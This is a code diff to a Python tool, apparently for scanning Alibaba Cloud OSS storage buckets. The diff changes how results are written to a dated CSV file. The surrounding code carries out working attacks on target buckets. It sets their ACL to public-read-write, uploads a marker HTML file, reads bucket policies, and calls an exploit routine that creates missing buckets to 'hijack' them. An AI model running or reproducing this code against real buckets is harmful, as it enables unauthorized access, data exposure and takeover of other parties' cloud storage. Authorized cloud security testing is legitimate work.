@@ -19,24 +19,27 @@ from config import conf
 import logging
 import os
 import csv
+import datetime
 
 module_logger = logging.getLogger("mainModule.AliyunOss")
+NowTime = datetime.datetime.now().strftime('%Y-%m-%d')
 
 
-def putCsvInfoResult(target, info):
-    with open(f'{os.getcwd()}/results/{target}.csv', 'a+', newline='') as f:
-        f_csv = csv.writer(f)
-        rows = [
-            [f"{target}", info]
-        ]
-        f_csv.writerows(rows)
-
-
-def setCsvHeaders(target):
+def results(target, info):
     headers = ['存储桶地址', '权限']
-    with open(f'{os.getcwd()}/results/{target}.csv', 'a+', newline='') as f:
-        f_csv = csv.writer(f)
-        f_csv.writerow(headers)
+    filepath = f'{os.getcwd()}/results/{NowTime}.csv'
+    rows = [
+        [f"{target}", info]
+    ]
+    if not os.path.isfile(filepath):
+        with open(filepath, 'a+', newline='') as f:
+            f = csv.writer(f)
+            f.writerow(headers)
+            f.writerows(rows)
+    else:
+        with open(filepath, 'a+', newline='') as f:
+            f_csv = csv.writer(f)
+            f_csv.writerows(rows)
 
 
 class OssBucketExploitFromSDK:
@@ -116,10 +119,7 @@ class OssBucketCheckFromSDK:
         auth = oss2.Auth(conf.AliyunAccessKey_ID, conf.AliyunAccessKey_Secret)
         self.bucket = oss2.Bucket(auth, f'http://{location}.aliyuncs.com', self.target)
         self.Exploit = OssBucketExploitFromSDK(self.target, location)
-        # 设置csvHeaders头
-        # setCsvHeaders(f"{target}.{location}.aliyuncs.com")
-        self.headers = [['Bucket', 'ListObject', 'GetBucketPolicy', 'PutBucketPolicy', 'GetBucketAcl', 'PutBucketAcl', 'PutBucketObject']]
-        self.CheckResult = []
+        self.results_list = []
 
     def AliyunOssPutBucketPolicy(self, getOssResource):
         """
@@ -138,6 +138,7 @@ class OssBucketCheckFromSDK:
             result = self.bucket.get_bucket_policy()
             policy_json = json.loads(result.policy)
             self.logger.info(f"Target: {self.target}, get Bucket Policy:)\n{policy_json}")
+            self.results_list.append("GetBucketPolicy")
         except oss2.exceptions.AccessDenied:
             self.logger.warning(f"Target: {self.target}, Bucket Policy AccessDenied:(")
 
@@ -147,6 +148,7 @@ class OssBucketCheckFromSDK:
             self.logger.info(f"Target: {self.target}, Bucket Exist:)")
             return True
         except oss2.exceptions.NoSuchBucket:
+            self.results_list.append("NoSuckBucket_HiJack")
             self.logger.warning(f"Target: {self.target}, NoSuckBucket:) Now Hijack Bucket")
             self.Exploit.AliyunOssCreateBucket_Exp()
             return False
@@ -159,13 +161,15 @@ class OssBucketCheckFromSDK:
     def AliyunOssGetBucketAcl(self):
         try:
             self.logger.info(f"Target: {self.target} Bucket Acl: {self.bucket.get_bucket_acl().acl}")
+            self.results_list.append("GetBucketAcl")
         except oss2.exceptions.AccessDenied:
             self.logger.warning(f"Target: {self.target} get Bucket Acl AccessDenied:(")
 
-    def AliyunOssPutbucketAcl(self):
+    def AliyunOssPutBucketAcl(self):
         try:
             self.bucket.put_bucket_acl(oss2.BUCKET_ACL_PUBLIC_READ_WRITE)
             self.logger.info(f"Target: {self.target} Put Bucket Acl Success:)")
+            self.results_list.append("PutBucketAcl")
         except oss2.exceptions.AccessDenied:
             self.logger.warning(f"Target: {self.target} Put Bucket Acl AccessDenied:(")
 
@@ -174,6 +178,7 @@ class OssBucketCheckFromSDK:
             self.logger.info("Try to list Object")
             for Object in islice(oss2.ObjectIterator(self.bucket), 3):
                 self.logger.info(f"Object Name: {Object.key}")
+            self.results_list.append("GetBucketObjectList")
         except oss2.exceptions.AccessDenied:
             self.logger.warning(f"Target: {self.target} ListObject AccessDenid")
             return
@@ -185,8 +190,12 @@ class OssBucketCheckFromSDK:
             self.bucket.put_object_from_file('UzJu.txt', f'{os.getcwd()}/config/UzJu.html')
             self.logger.info(f"Target: {self.target} Put Object Success:)")
             self.logger.info(f"Go Browser Open {self.target}.{self.location}.aliyuncs.com/UzJu.html")
+            self.results_list.append("PutBucketObject")
         except oss2.exceptions.AccessDenied:
             self.logger.warning(f"Target: {self.target} Put Object AccessDenied:(")
+
+    def CheckResult(self):
+        return self.results_list
 
 
 def CheckBucket(target, location):
@@ -197,6 +206,10 @@ def CheckBucket(target, location):
             check.AliyunOssGetBucketAcl()
             check.AliyunOssGetBucketPolicy()
             check.AliyunOssPutBucketObject()
+        if not check.CheckResult():
+            pass
+        else:
+            results(f"{target}.{location}.aliyuncs.com", check.CheckResult())
         module_logger.info(">" * 80)
     except Exception as e:
         module_logger.error(f"Target: {target} Chceck Faild:( {e}")
